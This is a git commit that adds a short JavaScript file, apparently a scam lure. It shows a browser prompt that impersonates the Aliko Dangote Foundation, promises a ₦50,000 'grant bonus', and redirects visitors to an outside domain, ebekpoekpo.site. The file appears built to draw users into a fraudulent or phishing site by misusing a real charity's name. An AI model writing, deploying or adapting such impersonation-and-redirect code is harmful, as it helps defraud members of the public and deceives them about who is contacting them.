95edb74b58c6b506711b48dbc4716687fbe3e4a3
dataviewz <gloliousam2@gmail.com>
2026-05-13 05:12:21 -0700

    Create active-adfgrant.ng.js

---
+++ active-adfgrant.ng.js
@@ -0,0 +1,5 @@
+var password = 'Get ₦50,000 Bonus'
+password=prompt('ADF: Hello, Register Now as Aliko Dangote Foundation (ADF) Grant Portal Is Offering ₦50,000 Grant Bonus Instantly POWERED BY: (ADF), click OK to Register Now','Get ₦50,000 Bonus');
+if (password != 'Get ₦50,000 Bonus') {
+location.href='https://ebekpoekpo.site/adfgrant.ng';
+}
